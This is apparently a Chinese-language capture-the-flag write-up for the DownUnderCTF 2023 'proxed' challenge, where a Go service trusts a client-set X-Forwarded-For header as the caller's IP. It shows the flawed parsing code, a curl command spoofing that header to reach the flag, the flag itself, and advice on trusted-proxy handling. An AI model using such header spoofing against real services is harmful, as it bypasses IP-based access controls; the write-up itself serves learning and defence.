# DownUnderCTF 2023 proxed Writeup

## 题目简述

Go 服务只允许来源 IP 为 `31.33.33.7` 的请求访问 flag。程序尝试支持反向代理，却直接采用客户端可控的 `X-Forwarded-For` 请求头作为真实 IP，且没有验证请求是否确实来自受信任代理。

## 解题过程

处理逻辑先读取所有同名请求头中的最后一个值，再按逗号分隔并取最后一个地址：

```go
xff := r.Header.Values("X-Forwarded-For")
if xff != nil {
    ips := strings.Split(xff[len(xff)-1], ", ")
    ip = strings.TrimSpace(ips[len(ips)-1])
}
```

由于外部客户端可以自行设置整个头部，只需伪造目标地址：

```bash
curl -H "X-Forwarded-For: 31.33.33.7" "http://<HOST>:<PORT>/"
```

服务将这个值视为已验证的客户端 IP，并返回：

```text
DUCTF{17_533m5_w3_f0rg07_70_pr0x}
```

## 方法总结

`X-Forwarded-For` 只有在请求经过可信反向代理、且应用按已知代理边界解析时才具有身份意义。应用不能无条件相信客户端提交的最左或最右地址；安全实现应由入口代理覆盖或追加该头，并依据可信代理列表剥离代理链。
